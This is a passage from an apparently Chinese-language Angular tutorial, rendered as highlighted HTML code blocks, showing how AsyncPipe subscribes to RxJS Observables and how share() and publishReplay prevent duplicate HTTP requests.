            <span class="token punctuation">.</span><span class="token function">take</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment">// 获取前面10个数据</span>
            <span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">v</span> <span class="token operator">=&gt;</span> v <span class="token operator">*</span> v<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 对每个数据进行乘方处理</span>
    <span class="token punctuation">}</span>
    <span class="token function">subscribeObservable</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>subscription <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getObservable</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">subscribe</span><span class="token punctuation">(</span><span class="token parameter">v</span> <span class="token operator">=&gt;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>observableData <span class="token operator">=</span> v<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">ngOnDestroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// 组件销毁时取消订阅，以避免潜在的内存泄漏</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>subscription<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>subscription<span class="token punctuation">.</span><span class="token function">unsubscribe</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br></div></div><p>app.component.ts</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> Component <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'exe-app'</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
   &lt;exe-observable&gt;&lt;/exe-observable&gt;
  </span><span class="token template-punctuation string">`</span></span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppComponent</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p>以上代码运行后浏览器显示的结果：</p> <center><img src="/vuebloger/img/post/3854584206-58cf54a0de7f0_fix732.png"></center> <ul><li>Observable 使用 AsyncPipe</li></ul> <p>observable-async-pipe.component.ts</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> Component <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Observable <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'rxjs/Rx'</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    selector<span class="token operator">:</span> <span class="token string">'exe-observable-pipe'</span><span class="token punctuation">,</span>
    template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
     &lt;h4&gt;Observable with AsyncPipe Component&lt;/h4&gt;
     &lt;p&gt;{{ observable | async }}&lt;/p&gt;
    </span><span class="token template-punctuation string">`</span></span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">ObservableAsyncPipeComponent</span> <span class="token punctuation">{</span>
    observable<span class="token operator">:</span> Observable<span class="token operator">&lt;</span>number<span class="token operator">&gt;</span>
    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>observable <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getObservable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">getObservable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> Observable<span class="token operator">&lt;</span>number<span class="token operator">&gt;</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> Observable
            <span class="token punctuation">.</span><span class="token function">interval</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">take</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">v</span> <span class="token operator">=&gt;</span> v <span class="token operator">*</span> v<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br></div></div><p>app.component.ts</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> Component <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'exe-app'</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
   &lt;exe-observable-pipe&gt;&lt;/exe-observable-pipe&gt;
  </span><span class="token template-punctuation string">`</span></span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppComponent</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p>以上代码运行后浏览器显示的结果：</p> <center><img src="/vuebloger/img/post/895451848-58cf54b0491f6_fix732.png"></center> <p>我们再来一个示例：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> Component<span class="token punctuation">,</span> OnInit <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Observable <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'rxjs/Rx'</span><span class="token punctuation">;</span>
<span class="token keyword">interface</span> <span class="token class-name">Hero</span> <span class="token punctuation">{</span>
    id<span class="token operator">:</span> number<span class="token punctuation">;</span>
    name<span class="token operator">:</span> string<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    selector<span class="token operator">:</span> <span class="token string">'async-pipe-example'</span><span class="token punctuation">,</span>
    template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
       &lt;h4&gt;Async Pipe Example&lt;/h4&gt;
       &lt;div&gt;
          &lt;h5&gt;Heroes: &lt;/h5&gt;
          &lt;ul&gt;
            &lt;li *ngFor=&quot;let hero of heroes$ | async&quot;&gt;
                {{ hero.name }}
            &lt;/li&gt;
          &lt;/ul&gt; 
          &lt;h5&gt;Hero: &lt;/h5&gt;
          &lt;p&gt; 
            &lt;span *ngIf=&quot;hero$&quot;&gt;{{ (hero$ | async).id }}&lt;/span&gt;
            &lt;span&gt;{{ (hero$ | async)?.name }}&lt;/span&gt;
          &lt;/p&gt;
       &lt;/div&gt;
    </span><span class="token template-punctuation string">`</span></span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AsyncPipeComponent</span> <span class="token keyword">implements</span> <span class="token class-name">OnInit</span> <span class="token punctuation">{</span>
    heroes$<span class="token operator">:</span> Observable<span class="token operator">&lt;</span>Hero<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">&gt;</span><span class="token punctuation">;</span>
    hero$<span class="token operator">:</span> Observable<span class="token operator">&lt;</span>Hero<span class="token operator">&gt;</span><span class="token punctuation">;</span>
    <span class="token function">getHeroes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> Observable<span class="token operator">&lt;</span>Hero<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">&gt;</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> Observable<span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token punctuation">[</span>
            <span class="token punctuation">{</span> id<span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> name<span class="token operator">:</span> <span class="token string">'Windstorm'</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>
            <span class="token punctuation">{</span> id<span class="token operator">:</span> <span class="token number">13</span><span class="token punctuation">,</span> name<span class="token operator">:</span> <span class="token string">'Bombasto'</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>
            <span class="token punctuation">{</span> id<span class="token operator">:</span> <span class="token number">15</span><span class="token punctuation">,</span> name<span class="token operator">:</span> <span class="token string">'Magneta'</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>
            <span class="token punctuation">{</span> id<span class="token operator">:</span> <span class="token number">20</span><span class="token punctuation">,</span> name<span class="token operator">:</span> <span class="token string">'Tornado'</span> <span class="token punctuation">}</span>
        <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">getHero</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> Observable<span class="token operator">&lt;</span>Hero<span class="token operator">&gt;</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> Observable<span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
            id<span class="token operator">:</span> <span class="token number">31</span><span class="token punctuation">,</span> name<span class="token operator">:</span> <span class="token string">'Semlinker'</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">ngOnInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>heroes$ <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getHeroes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>hero$ <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getHero</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br></div></div><p>以上代码运行后浏览器显示的结果：</p> <center><img src="/vuebloger/img/post/2913494479-58cfcb110be04_fix732.png"></center> <p>上面例子中有两个注意点：</p> <ol><li>使用 ngIf 控制 span 元素的显示：</li></ol> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token operator">&lt;</span>span <span class="token operator">*</span>ngIf<span class="token operator">=</span><span class="token string">&quot;hero$&quot;</span><span class="token operator">&gt;</span><span class="token punctuation">{</span><span class="token punctuation">{</span> <span class="token punctuation">(</span>hero$ <span class="token operator">|</span> async<span class="token punctuation">)</span><span class="token punctuation">.</span>id <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>span<span class="token operator">&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><ol start="2"><li>使用 ?. 安全导航操作符，控制 name 属性的显示：</li></ol> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token operator">&lt;</span>span<span class="token operator">&gt;</span><span class="token punctuation">{</span><span class="token punctuation">{</span> <span class="token punctuation">(</span>hero$ <span class="token operator">|</span> async<span class="token punctuation">)</span><span class="token operator">?.</span>name <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>span<span class="token operator">&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>若去掉 ngIf 或 ?. ，应用程序将会抛出异常。</p> <h3 id="asyncpipe-导致多次请求"><a href="#asyncpipe-导致多次请求" class="header-anchor">#</a> AsyncPipe 导致多次请求</h3> <p>使用rxjs流式编程AsyncPipe是一把利器。我们通常会想到既然都在流中操作，那么可以直接把请求的流数据直接引向html?当然是可以的。事实上，AsyncPipe只是把自动订阅和取消订阅的操作给我做好了。angular做的很好的一点就是很多复杂繁多的逻辑他们都在模板语法使用的时候已经帮我们处理好了，就像动态组件一样使用NgTemplateOutlet指令省去了我们在ts中使用viewContainerRef做一系列的操作,正因为如此产生了个坑，使用Observable很容易产生重复订阅问题，使用promise就不会。不过我们如果对rxjs编程信心满满，还是有办法解决的。我们来看看下面的案例：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// app.component.ts</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Component<span class="token punctuation">,</span> OnInit <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Http <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/http'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Observable <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'rxjs/Rx'</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'exe-app'</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
   &lt;div&gt;
      &lt;p&gt;{{ (person$ | async)?.id }}&lt;/p&gt;
      &lt;p&gt;{{ (person$ | async)?.title }}&lt;/p&gt;
      &lt;p&gt;{{ (person$ | async)?.body }}&lt;/p&gt;
    &lt;/div&gt;
  </span><span class="token template-punctuation string">`</span></span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppComponent</span> <span class="token keyword">implements</span> <span class="token class-name">OnInit</span> <span class="token punctuation">{</span>
  person$<span class="token operator">:</span> Observable<span class="token operator">&lt;</span><span class="token punctuation">{</span> id<span class="token operator">:</span> number<span class="token punctuation">;</span> title<span class="token operator">:</span> string<span class="token punctuation">;</span> body<span class="token operator">:</span> string <span class="token punctuation">}</span><span class="token operator">&gt;</span><span class="token punctuation">;</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter"><span class="token keyword">private</span> http<span class="token operator">:</span> Http</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>
  <span class="token function">ngOnInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>person$ <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>http<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'https://jsonplaceholder.typicode.com/posts/1'</span><span class="token punctuation">)</span>
      <span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">res</span> <span class="token operator">=&gt;</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br></div></div><p>你会发现发送了三个重复的请求。这是因为我们的 Observable 是 cold 的，每处使用 async 管道的地方都会执行一次。针对上述问题，大部分人推荐的解决方案如下：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">this</span><span class="token punctuation">.</span>http<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'https://jsonplaceholder.typicode.com/posts/1'</span><span class="token punctuation">)</span>
     <span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">res</span> <span class="token operator">=&gt;</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">share</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>我们只需使用 RxJS 中的共享操作符，它在内部调用 publish().refCount()。还有一种情况又会触发 HTTP 请求</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> Component<span class="token punctuation">,</span> OnInit <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Http <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/http'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Observable <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'rxjs/Rx'</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'exe-app'</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
   &lt;div&gt;
      &lt;p&gt;{{ (person$ | async)?.id }}&lt;/p&gt;
      &lt;p&gt;{{ (person$ | async)?.title }}&lt;/p&gt;
      &lt;p&gt;{{ (person$ | async)?.body }}&lt;/p&gt;
      &lt;button (click)=&quot;showPersonInfo()&quot;&gt;显示用户ID&lt;/button&gt;
      &lt;p *ngIf=&quot;isShow&quot;&gt;{{ (person$ | async)?.id }}&lt;/p&gt;
    &lt;/div&gt;
  </span><span class="token template-punctuation string">`</span></span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppComponent</span> <span class="token keyword">implements</span> <span class="token class-name">OnInit</span> <span class="token punctuation">{</span>
  person$<span class="token operator">:</span> Observable<span class="token operator">&lt;</span><span class="token punctuation">{</span> id<span class="token operator">:</span> number<span class="token punctuation">;</span> title<span class="token operator">:</span> string<span class="token punctuation">;</span> body<span class="token operator">:</span> string <span class="token punctuation">}</span><span class="token operator">&gt;</span><span class="token punctuation">;</span>
  isShow<span class="token operator">:</span> boolean <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter"><span class="token keyword">private</span> http<span class="token operator">:</span> Http</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>
  <span class="token function">ngOnInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>person$ <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>http<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'https://jsonplaceholder.typicode.com/posts/1'</span><span class="token punctuation">)</span>
      <span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">res</span> <span class="token operator">=&gt;</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
      <span class="token punctuation">.</span><span class="token function">share</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token function">showPersonInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>isShow <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br></div></div><p>以上代码运行后浏览器显示的结果：</p> <center><img src="/vuebloger/img/post/300313630-58d0d1c3aa91a_fix732.png"></center> <p>我们发现当点击 '显示用户ID' 按钮时，又触发了新的请求。这个时候可以使用publishReplay或shareReplay(1)</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> Component<span class="token punctuation">,</span> OnInit <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Http <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/http'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Observable<span class="token punctuation">,</span> ConnectableObservable <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'rxjs/Rx'</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'exe-app'</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
   &lt;div&gt;
      &lt;p&gt;{{ (person$ | async)?.id }}&lt;/p&gt;
      &lt;p&gt;{{ (person$ | async)?.title }}&lt;/p&gt;
      &lt;p&gt;{{ (person$ | async)?.body }}&lt;/p&gt;
      &lt;button (click)=&quot;showPersonInfo()&quot;&gt;显示用户ID&lt;/button&gt;
      &lt;p *ngIf=&quot;isShow&quot;&gt;{{ (person$ | async)?.id }}&lt;/p&gt;
    &lt;/div&gt;
  </span><span class="token template-punctuation string">`</span></span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppComponent</span> <span class="token keyword">implements</span> <span class="token class-name">OnInit</span> <span class="token punctuation">{</span>
  person$<span class="token operator">:</span> ConnectableObservable<span class="token operator">&lt;</span><span class="token punctuation">{</span> id<span class="token operator">:</span> number<span class="token punctuation">;</span> title<span class="token operator">:</span> string<span class="token punctuation">;</span> body<span class="token operator">:</span> string <span class="token punctuation">}</span><span class="token operator">&gt;</span><span class="token punctuation">;</span>
  isShow<span class="token operator">:</span> boolean <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter"><span class="token keyword">private</span> http<span class="token operator">:</span> Http</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">preparePersonInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token function">ngOnInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>person$<span class="token punctuation">.</span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token function">preparePersonInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>person$ <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>http<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'https://jsonplaceholder.typicode.com/posts/1'</span><span class="token punctuation">)</span>
      <span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">res</span> <span class="token operator">=&gt;</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
      <span class="token punctuation">.</span><span class="token function">publishReplay</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
  <span class="token function">showPersonInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>isShow <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
